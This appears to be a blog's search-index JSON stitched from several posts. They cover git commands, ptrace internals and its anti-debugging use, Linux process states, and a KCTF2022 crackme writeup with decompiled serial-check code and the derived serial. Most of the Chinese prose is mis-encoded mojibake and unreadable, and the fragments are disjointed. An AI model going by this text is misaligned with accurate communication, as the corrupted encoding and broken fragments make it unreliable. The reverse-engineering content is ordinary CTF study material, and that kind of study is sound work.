æ¸…é™¤æ’¤é”€commitçš„ä¸€åˆ‡è®°å½• git revert ç”Ÿæˆæ–°çš„æ’¤é”€commit ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:1","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["Dev"],"content":"#mergeå’Œrebase mergeï¼šåˆå¹¶ä¸¤åˆ†æ”¯ï¼Œä¿ç•™æ‰€æœ‰æäº¤è®°å½• rebaseï¼šå˜åŸºï¼Œæ”¹å˜ä¸€éƒ¨åˆ†commitè®°å½•ï¼Œä½¿git logæ›´åŠ ç®€æ´ rebase -iï¼šå¸¸ç”¨äºé‡æ’commit ","date":"2022-12-03","objectID":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/:8:2","tags":["git"],"title":"ç‰ˆæœ¬æ§åˆ¶ï¼ˆgitï¼‰","uri":"/2022/12/%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6git/"},{"categories":["WriteUps"],"content":"1.Flaredle ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:1:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"2.PixelPoker ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:2:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"3.Magic 8 Ball ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:3:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"4.darn_mice ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:4:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"5.T8 ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:5:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"6.a la mode ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:6:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"7.anode ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:7:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"8.backdoor ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:8:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"9.encryptor ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:9:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"10.Nur getrÃ¤umt ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:10:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["WriteUps"],"content":"11.Paul Tarter ","date":"2022-11-30","objectID":"/2022/11/flare-on9-wp/:11:0","tags":["CTF","reverse"],"title":"[TODO]Flare-On9 Challenges WriteUp","uri":"/2022/11/flare-on9-wp/"},{"categories":["Binary"],"content":"ä¼—è¯´çº·çº­ æœ€è¿‘åœ¨å­¦ptraceçš„å„ç§ç”¨æ³•ï¼Œçœ‹åˆ°ä½¿ç”¨PTRRACE_PEEKDATAè¯»å–æ•°æ®æ—¶äº§ç”Ÿäº†ç–‘æƒ‘ ptraceå‡½æ•°ç­¾åï¼š long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); å¤§é‡æ–‡ç« ä¸­å†™é“: PTRRACE_PEEKDATAä»å†…å­˜åœ°å€ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå†…å­˜åœ°å€ç”±addrç»™å‡º é‡ç‚¹åœ¨äºè¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œä½†å¥‡æ€ªçš„æ˜¯ptraceå‡½æ•°è¿”å›å€¼å´æ˜¯longç±»å‹ å°‘éƒ¨åˆ†æ–‡ç« ä¸­æ”¹æˆäº†è¯»å–å››ä¸ªå­—èŠ‚ï¼Œä¼°è®¡æ˜¯æ³¨æ„åˆ°äº†longç±»å‹è¿”å›å€¼ åˆå»æŸ¥äº†æŸ¥ptraceæ–‡æ¡£ï¼Œä¸Šé¢è¿™ä¹ˆæè¿°ï¼š Read a word at the address addr in the traceeâ€™s memory, returning the word as the result of the ptrace() call. æ€ä¹ˆåˆå˜æˆäº†ä¸€ä¸ªå­—ï¼ˆwordï¼‰ï¼Œä¸¤ä¸ªå­—èŠ‚ï¼Ÿ ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:1:0","tags":["misunderstanding"],"title":"â€œå­—â€çš„æ­§ä¹‰--æ·±å…¥ptraceè¿”å›å€¼ç±»å‹","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"æŸ³æš—èŠ±æ˜ æœ€ç»ˆå‘ç°äº†stackoverflowçš„ä¸€ç¯‡æ–‡ç« ï¼Œå…¶ä¸­æåˆ°ptraceæ–‡æ¡£ä¸­çš„ä¸€ä¸ªnoteï¼ˆå°å°åæ§½ä¸€ä¸‹ï¼Œè¿™ä¸ªnoteåœ¨æ•´ç¯‡æ–‡ç« çš„æœ«å°¾ï¼Œå‰æ–‡ä¹Ÿæ²¡ä»€ä¹ˆæ ‡æ³¨ï¼Œä¸ä¸“é—¨å»æ‰¾å¾ˆéš¾çœ‹åˆ° The size of a â€œwordâ€ is determined by the operating-system variant (e.g., for 32-bit Linux it is 32 bits). ç”±æ­¤ç»ˆäºæ¸…æ¥šï¼Œè¿™é‡Œæ‰€è¯´çš„wordç”±æ“ä½œç³»ç»Ÿä½æ•°å†³å®šï¼Œ32ä½ç³»ç»Ÿä¸Šæ˜¯32ä½ï¼Œ64ä½ç³»ç»Ÿä¸Šæ˜¯64ä½ ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:2:0","tags":["misunderstanding"],"title":"â€œå­—â€çš„æ­§ä¹‰--æ·±å…¥ptraceè¿”å›å€¼ç±»å‹","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"â€œå­—â€çš„æ­§ä¹‰ ä½œä¸ºå¤©å¤©è·Ÿæ±‡ç¼–æ‰“äº¤é“çš„é€†å‘å£¬ï¼Œæˆ‘å…ˆå…¥ä¸ºä¸»çš„è®¤ä¸ºä¸€ä¸ªwordå°±æ˜¯2å­—èŠ‚ï¼Œå´å¿˜äº†wordçš„å®šä¹‰ï¼š AÂ word is the amount of data that a machine can process at one time. ä¹‹æ‰€ä»¥åœ¨æ±‡ç¼–ä»¥åŠè®¸å¤šåœºåˆä¸­æŠŠå­—ï¼ˆwordï¼‰è§„å®šä¸º2å­—èŠ‚ï¼ˆ2 bytesï¼‰ï¼Œå¤§æ¦‚æ˜¯ä¸ºäº†æ›´ç»Ÿä¸€ã€æ›´å‡†ç¡®åœ°æè¿°æ•°æ®å¤§å°ï¼Œå¹¶ä¸”å‡ºç°äº†åŒå­—ã€å››å­—ä¹‹ç±»çš„ä¸œè¥¿ ä½†ä»æœ‰å¾ˆå¤šæƒ…å†µä¸‹ï¼Œä»ä½¿ç”¨â€œå­—â€çš„åŸå§‹å®šä¹‰ï¼Œä¸ç³»ç»Ÿä¸€æ¬¡èƒ½å¤„ç†çš„æœ€å¤§æ•°æ®é‡ç›¸å¯¹åº”ï¼Œlongè¿™ç§Cè¯­è¨€æ•°æ®ç»“æ„çš„å¤§å°å³æ˜¯ä¸€ä¸ªâ€œå­—â€ ","date":"2022-11-20","objectID":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/:3:0","tags":["misunderstanding"],"title":"â€œå­—â€çš„æ­§ä¹‰--æ·±å…¥ptraceè¿”å›å€¼ç±»å‹","uri":"/2022/11/%E5%AD%97%E7%9A%84%E6%AD%A7%E4%B9%89--%E6%B7%B1%E5%85%A5ptrace%E8%BF%94%E5%9B%9E%E5%80%BC%E7%B1%BB%E5%9E%8B/"},{"categories":["Binary"],"content":"linux ptraceæŠ€æœ¯ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚è¿°ä¸å‡½æ•°å‚æ•° ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:1:0","tags":["linux","reverse"],"title":"linux ptraceç›¸å…³æŠ€æœ¯ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚è¿°ä¸ptraceå‡½æ•°","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"ptraceæ¦‚è¿° é€†å‘å£¬åº”è¯¥éƒ½å¯¹ptraceå¹¶ä¸é™Œç”Ÿï¼Œå¸¸å‡ºç°äºELFæ–‡ä»¶çš„åè°ƒè¯•ä¸­ã€‚ ptraceå…¶å®æ˜¯linuxçš„ä¸€ç§ç³»ç»Ÿè°ƒç”¨ï¼Œä¸€èˆ¬ç”¨äºè°ƒè¯•æŠ€æœ¯ã€‚ä½¿ç”¨ptraceå¯ä»¥å®ç°çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹çš„ç›‘æ§å’Œæ§åˆ¶ï¼Œç”±æ­¤å¼€å‘äº†åŠ¨æ€åˆ†æå·¥å…·å¦‚straceå’Œgdbã€‚å› ä¸ºåŒä¸€æ—¶é—´ä¸€ä¸ªå­è¿›ç¨‹åªèƒ½è¢«å”¯ä¸€çš„çˆ¶è¿›ç¨‹è¿½è¸ªï¼Œæ‰€ä»¥ä»£ç å†…è°ƒç”¨ptraceçœ‹èƒ½å¦æˆåŠŸé™„åŠ åˆ°ä¸»è¿›ç¨‹ï¼Œå¯ä»¥ç”¨æ¥æ£€éªŒæ˜¯å¦æœ‰è°ƒè¯•å™¨é™„åŠ åˆ°ä¸»è¿›ç¨‹ï¼Œèµ·åˆ°åè°ƒè¯•çš„ä½œç”¨ã€‚ ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:2:0","tags":["linux","reverse"],"title":"linux ptraceç›¸å…³æŠ€æœ¯ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚è¿°ä¸ptraceå‡½æ•°","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"ptraceå‡½æ•°åŸå‹åŠå‚æ•° #include \u003csys/ptrace.h\u003e long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data); requestï¼šè¦è¿›è¡Œçš„ptraceæ“ä½œ pidï¼šè¦æ“ä½œçš„è¿›ç¨‹å· addrï¼šè¦ç›‘æ§/ä¿®æ”¹çš„å†…å­˜åœ°å€ dataï¼šè¦è¯»å–/å†™å…¥çš„æ•°æ®å˜é‡ å¸¸è§requestç±»å‹ï¼š PTRACE_TRACE: è¡¨ç¤ºæœ¬è¿›ç¨‹å¸Œæœ›è¢«çˆ¶è¿›ç¨‹è·Ÿè¸ª, ä¸»åŠ¨ä¸çˆ¶è¿›ç¨‹å»ºç«‹è¿½è¸ªæœºåˆ¶ PTRACE_PEEKTEXT, PTRACE_PEEKDATA: ä»addræŒ‡å®šçš„å†…å­˜åœ°å€ä¸­å–å‡ºæ•°æ® PTRACE_POKETEXT, PTRACE_POKEDATA: å‘addræŒ‡å®šçš„å†…å­˜åœ°å€ä¸­å†™å…¥æ•°æ® PETRACE_PEEKUSER: ä»USERç»“æ„ä½“ä¸­ï¼Œåç§»é‡ä¸ºaddrå¤„å–å‡ºæ•°æ® PETRACE_POKEUSER: å‘USERç»“æ„ä½“ä¸­ï¼Œåç§»é‡ä¸ºaddrå¤„å†™å…¥æ•°æ® PTRACE_CONT: ä½¿å­è¿›ç¨‹ç»§ç»­è¿è¡Œ PTRACE_KILL: æ€æ‰å­è¿›ç¨‹ PTRACE_SINGLESTEP: å­è¿›ç¨‹å•æ­¥æ‰§è¡Œ PTRACE_ATTACH: çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œå¹¶å‘é€SIGSTOPä¿¡å·ä½¿å…¶æš‚åœ PTRACE_DETACH: çˆ¶è¿›ç¨‹è§£é™¤å¯¹å­è¿›ç¨‹çš„è¿½è¸ªå…³ç³»ï¼Œè®©å­è¿›ç¨‹ç»§ç»­è¿è¡Œ PTRACE_SEIZE: çˆ¶è¿›ç¨‹å¯¹å­è¿›ç¨‹å»ºç«‹è¿½è¸ªå…³ç³»ï¼Œä½†ä¸ä¼šè®©å­è¿›ç¨‹æš‚åœï¼Œä¸”è¦æŒ‡å®šdataå‚æ•°ptrace(PTRACE_SEIZE, pid, 0, PTRACE_0_flags); PTRACE_SYSCALL: ä½¿è¢«åœæ­¢çš„å­è¿›ç¨‹ç»§ç»­è¿è¡Œï¼Œå¹¶åœ¨ä¸‹æ¬¡è¿›å…¥æˆ–é€€å‡ºç³»ç»Ÿè°ƒç”¨æ—¶åœæ­¢ã€‚ ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:3:0","tags":["linux","reverse"],"title":"linux ptraceç›¸å…³æŠ€æœ¯ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚è¿°ä¸ptraceå‡½æ•°","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["Binary"],"content":"Reference https://stackoverflow.com/questions/9803908/difference-between-ptraceptrace-peekuser-and-ptraceptrace-peekdata ","date":"2022-11-20","objectID":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/:4:0","tags":["linux","reverse"],"title":"linux ptraceç›¸å…³æŠ€æœ¯ï¼ˆä¸€ï¼‰åŸºæœ¬æ¦‚è¿°ä¸ptraceå‡½æ•°","uri":"/2022/11/%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0%E4%B8%8Eptrace%E5%87%BD%E6%95%B0/"},{"categories":["WriteUps"],"content":"62è¿›åˆ¶å¤§æ•°è¿ç®— å¦‚ä½•é¢å¯¹ä¸€å †ä¹±ä¸ƒå…«ç³Ÿçš„å‡½æ•°ä¿æŒå†·é™ä¸è€å¿ƒæ˜¯è¿™é“é¢˜æœ€å¤§çš„éš¾ç‚¹ï¼ˆï¼ˆ æœä¸€ä¸‹IRtzloZ6iuBä¼šå‘ç°æœ‰å…³62è¿›åˆ¶çš„å†…å®¹ï¼Œç»“åˆ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzè¿™ä¸ªè¡¨åŸºæœ¬å¯ä»¥ç¡®å®šã€‚ä»£ç ä½¿ç”¨ç»“æ„ä½“å­˜å‚¨å¤§æ•°ï¼Œå‰å››å­—èŠ‚ä¸ºä½æ•°lenï¼Œå32å­—èŠ‚ä¸ºå…·ä½“æ•°æ®dataï¼Œåœ¨IDAä¸­å¯ä»¥è‡ªè¡Œåˆ›å»ºç»“æ„ä½“ä½¿ä»£ç æ›´å¥½çœ‹ ç„¶åå°±æ˜¯æ¼«é•¿çš„å¤åŸå‡½æ•°çš„è¿‡ç¨‹ï¼Œæœ€ç»ˆIDAå‡½æ•°åˆ—è¡¨ä¸­_mainå‡½æ•°ä¸Šé¢ä»ä¸Šåˆ°ä¸‹ä¾æ¬¡æ˜¯ï¼š base62_decode base62_init base62_cpy base62_cmp base62_add base62_sub base62_and base62_or base62_xor base62_mul base62_div base62_mod base62_mod_ret // ä¸ä¿®æ”¹å‚æ•°å€¼ï¼Œè¿”å›å€¼æ˜¯ç»“æœ base62_shl base62_shr ä¸‰ä¸ªæˆ–å››ä¸ªå‚æ•°çš„å‡½æ•°ç¬¬ä¸€ä¸ªå‚æ•°å‚¨å­˜ç»“æœï¼Œä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ä½¿ç”¨è¿”å›å€¼ä½œç»“æœï¼ˆinitå’Œcpyä¸¤ä¸ªå‡½æ•°é™¤å¤–ï¼‰ å¤åŸmainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { int split_index; // edi int len; // eax int v6; // esi int v7; // eax char input; // [esp+8h] [ebp-40h] BYREF char v10[60]; // [esp+9h] [ebp-3Fh] BYREF __int16 v11; // [esp+45h] [ebp-3h] char v12; // [esp+47h] [ebp-1h] input = 0; memset(v10, 0, sizeof(v10)); v11 = 0; v12 = 0; printf((int)\"Input:\"); gets(\u0026input); split_index = -1; len = 0; if ( !input ) goto LABEL_20; do { if ( len \u003e= 64 ) break; if ( v10[len - 1] == '-' ) split_index = len; } while ( v10[len++] ); if ( split_index \u003e 0 \u0026\u0026 (v6 = len - split_index, len - split_index \u003e 0) \u0026\u0026 base62_decode(\u0026left, \u0026input, split_index, a0123456789abcd) \u003e 0 \u0026\u0026 base62_decode(\u0026right, \u0026v10[split_index], v6 - 1, a0123456789abcd) \u003e 0 \u0026\u0026 (base62_decode(\u0026mod_const, aIrtzloz6iub, strlen(aIrtzloz6iub), a0123456789abcd), base62_init(\u0026tmp1, 0), base62_init(\u0026tmp2, 0), base62_cmp(\u0026left, \u0026right) \u003c 0) // left \u003c right \u0026\u0026 base62_cmp(\u0026left, \u0026mod_const) \u003c 0 // left \u003c mod_const \u0026\u0026 base62_cmp(\u0026right, \u0026mod_const) \u003c 0 ) // right \u003c mod_const { v7 = 0; while ( 1 ) { j = v7 + 1; base62_add(\u0026tmp1, \u0026tmp1, \u0026left); base62_add(\u0026tmp2, \u0026tmp2, \u0026right); base62_mod(\u0026tmp1, \u0026tmp1, \u0026mod_const); base62_mod(\u0026tmp2, \u0026tmp2, \u0026mod_const); base62_init(\u0026var1, 1); base62_sub(\u0026var1, \u0026tmp1, \u0026var1); if ( !base62_cmp(\u0026var1, \u0026left) ) { ++cnt; base62_mul(\u0026var1, \u0026var1, \u0026left); } base62_init(\u0026var2, 1); base62_add(\u0026var2, \u0026tmp2, \u0026var2); if ( !base62_cmp(\u0026var2, \u0026right) ) { ++cnt; base62_div(\u0026var2, \u0026mod_const, \u0026right); } if ( cnt == 10 ) break; v7 = j; if ( j \u003e= 0x200000 ) goto LABEL_20; } printf((int)\"Success!\\n\"); return 0; } else { LABEL_20: printf((int)\"Error.\\n\"); return 0; } } å¯ä»¥å‘ç°ï¼Œinputæ˜¯è¢«-åˆ†å¼€çš„å·¦å³ä¸¤éƒ¨åˆ†å­—ç¬¦ä¸²ï¼Œç„¶åæŠŠè¿™ä¸¤éƒ¨åˆ†å­—ç¬¦ä¸²å½“ä½œ62è¿›åˆ¶æ•°ä½¿ç”¨base62_decodeå‡½æ•°è½¬æˆ10è¿›åˆ¶ï¼ˆ16è¿›åˆ¶ï¼‰å­˜å…¥leftå’Œrightï¼Œmod_constæ˜¯ç”±62è¿›åˆ¶æ•°Bui6ZolztRIè§£ç å¾—åˆ°çš„ï¼Œè®¡ç®—å¾—åˆ°æ˜¯10çš„19æ¬¡æ–¹ã€‚ä¸‹é¢è¿˜æœ‰å¯¹leftå’Œrightçš„é™åˆ¶ï¼Œå³left \u003c right \u003c mod_const ä¸‹é¢çš„while(1)å¾ªç¯ä¸­ï¼Œåªæœ‰cnt==0æ‰èƒ½æ­£å¸¸breakè¾“å‡ºSuccessï¼Œä¸”é€šè¿‡äº¤å‰å¼•ç”¨å¯ä»¥å‘ç°æ•´ä¸ªç¨‹åºåªæœ‰ä¸¤ä¸ªifä¸­++cntå¯¹cntçš„å€¼è¿›è¡Œwå¼•ç”¨ï¼Œå®¹æ˜“æƒ³åˆ°çš„checké€»è¾‘æ˜¯ï¼š $( left * j_1 - 1) mod 10^{19} = left$ $(right * j_2 + 1) mod 10^{19} = right$ ä¸”åœ¨$1 \u003c= j \u003c 0x200000$ä¸­ï¼Œéšç€jå¢å¤§ï¼Œj1ã€j2æ€»å…±æ»¡è¶³10æ¬¡ã€‚è¿™å¯¹ä¸€ä¸ªé€†å‘å£¬å®å±è¶…çº²äº†ï¼Œäºæ˜¯åšçš„æ—¶å€™è¿™é“é¢˜åˆ°è¿™å°±é™·å…¥äº†æ­»å±€ã€‚ ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:1:0","tags":["CTF","reverse"],"title":"KCTF2022ç§‹å­£èµ›ç¬¬äºŒé¢˜WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["WriteUps"],"content":"ä¸èµ·çœ¼å‡½æ•°ä¸­æš—è—å…³é”®é€»è¾‘ åœ¨å¤åŸå„ç§å‡½æ•°æ—¶ï¼Œæˆ‘æ˜¯ä¸€è¾¹åŠ¨è°ƒï¼Œä¸€è¾¹è¿è’™å¸¦çŒœï¼Œçœ‹å‡ºå¤§æ¦‚ç”¨é€”å°±ç›´æ¥æŠŠæ•´ä¸ªå‡½æ•°å½“ä½œé»‘ç›’å¤„ç†äº†ã€‚ç»“æŸåçœ‹äº†çœ‹åˆ«é˜Ÿçš„wpï¼Œæ‰å‘ç°åœ¨base62_mulå’Œbase62_divä¸­æœ«å°¾è—ç€ä¸¤æ®µå…³é”®çš„é€»è¾‘ base62_init(\u0026var1, 4); // var1.data = 4 base62_shl(\u0026var2.len, \u0026var1.len, 3); // val2.data = 4 \u003c\u003c 3 = 32 if ( cnt \u003e 0 \u0026\u0026 *(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026var1, \u0026var1, \u0026var2); // var1.data = var1.data + var2.data = 4 + 32 = 36 v12 = base62_mod_ret(\u0026var1, j); // v12 = var1.data % j = 36 % 32 = 4 mod_const.data[var1.data[0]] += 4; base62_shl(\u0026var1.len, \u0026var1.len, v12); base62_sub(\u0026var2, \u0026var1, \u0026var2); } base62_init(\u0026var1, 4); base62_shl(\u0026var2.len, \u0026var1.len, 3); if ( cnt \u003e 0 \u0026\u0026 *(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0] ) { base62_add(\u0026var1, \u0026var1, \u0026var2); v11 = base62_mod_ret(\u0026var1, ::j); mod_const.data[var1.data[0]] += 4; base62_shl(\u0026var1.len, \u0026var1.len, v11); base62_sub(\u0026var2, \u0026var1, \u0026var2); } ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:2:0","tags":["CTF","reverse"],"title":"KCTF2022ç§‹å­£èµ›ç¬¬äºŒé¢˜WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["WriteUps"],"content":"æ•°ç»„è¶Šç•Œå–å€¼æ˜¯æ–°é¢–è¿˜æ˜¯åˆéš¾ åœ¨ä¸Šè¿°ä¸¤æ®µéšè—çš„é€»è¾‘ä¸­,å¼€å¤´ä¸¤å¥å…ˆæŠŠvar1åˆå§‹åŒ–ä¸º4ï¼Œå†æŠŠvar1å·¦ç§»3ç­‰äº32èµ‹ç»™var2ï¼Œä¸‹é¢çš„åˆ¤æ–­*(_DWORD *)\u0026mod_const.data[var2.data[0]] == var2.data[0ï¼Œvar2.data[0] == 32ï¼Œè€Œmod_const.dataåªæœ‰32ä½ï¼Œæ•…è®¿é—®ä¸‹æ ‡32å¤„ä¼šå‘ç”Ÿæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥å‘ç°ä¸‹ä¸€ä¸ªå››å­—èŠ‚å­˜çš„æ˜¯mainå‡½æ•°ä¸­çš„jï¼Œæ‰€ä»¥åˆ¤æ–­æ¡ä»¶å®é™…æ˜¯cnt \u003e 0 \u0026\u0026 j == 32 ifå—ä¸­ä»£ç é¦–å…ˆæŠŠvar1.dataæ”¹æˆäº†36ï¼Œæ­¤æ—¶è®¿é—®mod_const.data[var1.data[0]]åŒæ ·ä¼šå‡ºç°è¶Šç•Œï¼Œå®é™…è®¿é—®çš„å…¶å®æ˜¯mainå‡½æ•°ä¸­çš„cntï¼Œä½¿cnt += 4ï¼Œä¸¤ä¸ªifå—å…±åŠ 8ï¼ŒåŠ ä¸Šå¤–å±‚ä¸¤ä¸ªåŠ 1åˆšå¥½ä¸º10,ç¬¦åˆé¢˜ç›®æ¡ä»¶ã€‚ æ­¤æ—¶å†å›åˆ°ä¸Šé¢åˆ—å‡ºçš„ç­‰å¼ï¼Œæ‰€æ±‚å…¶å®æ˜¯j1 == j2 == 32æ—¶çš„ç‰¹æ®Šè§£ å³ $$ \\left{ \\begin{matrix} ( left * 32 - 1) mod 10^{19} = left \\ ( right * 32 + 1) mod 10^{19} = right \\end{matrix} \\right. $$ å˜å½¢ä¸€ä¸‹ $$ \\left{ \\begin{matrix} left * 31 = k_1 * 10^{19} + 1 \\ right * 31 = k_2 * 10^{19} - 1 \\ left, right, k_1, k_2 \\in N^* \\ left \u003c right \u003c mod_const \\end{matrix} \\right. $$ è§£å¾— k1 = 12 k2 = 19 left = 0x35b870a6eb0f7bdf right = 0x550eb25d9ed88421 æŠŠleftå’Œrightè½¬æ¢æˆ62è¿›åˆ¶æ•°å³å¯å¾—æœ€ç»ˆåºåˆ—å·ZSxZerX4xb4-jyvP7x12lI7 ","date":"2022-11-19","objectID":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/:3:0","tags":["CTF","reverse"],"title":"KCTF2022ç§‹å­£èµ›ç¬¬äºŒé¢˜WriteUp","uri":"/2022/11/kctf2022%E7%A7%8B%E5%AD%A3%E8%B5%9B%E7%AC%AC%E4%BA%8C%E9%A2%98writeup/"},{"categories":["Binary"],"content":"è¿›ç¨‹çŠ¶æ€ ä¸€å°linuxæœºå™¨ä¸Šè¿è¡Œç€å¤šä¸ªè¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹åœ¨åŒä¸€æ—¶é—´éƒ½å¤„åœ¨ä¸€ç§ç‰¹å®šçš„çŠ¶æ€ï¼Œç§°ä¸ºè¿›ç¨‹çŠ¶æ€ï¼Œå¸¸è§çš„è¿›ç¨‹çŠ¶æ€å¦‚ä¸‹ï¼š ","date":"2022-11-17","objectID":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/:1:0","tags":["linux","reverse"],"title":"linuxè¿›ç¨‹åŸºç¡€","uri":"/2022/11/linux%E8%BF%9B%E7%A8%8B%E5%9F%BA%E7%A1%80/"},{"categories":["Binary"],"content":"R(TASK_RUNNING)ï¼Œå¯æ‰§è¡ŒçŠ¶æ€ ç”±äºä¸€ä¸ªå•æ ¸CPUåœ¨åŒä¸€æ—¶é—´åªèƒ½æ‰§è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯æ‰€æœ‰å¤„äºå¯æ‰§è¡ŒçŠ¶æ€çš„è¿›ç¨‹éƒ½æ­£åœ¨è¢«CPUæ‰§è¡Œï¼Œå¤„äºå¯æ‰§è¡ŒçŠ¶æ€çš„è¿›ç¨‹ä¼šè¢«æ·»åŠ åˆ°CPUçš„æ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œç”±è¿›ç¨‹è°ƒåº¦å™¨å†³å®šæ¯ä¸€åˆ»çœŸæ­£æ‰§è¡Œçš„æ˜¯å“ªä¸€ä¸ªè¿›ç¨‹ã€‚ 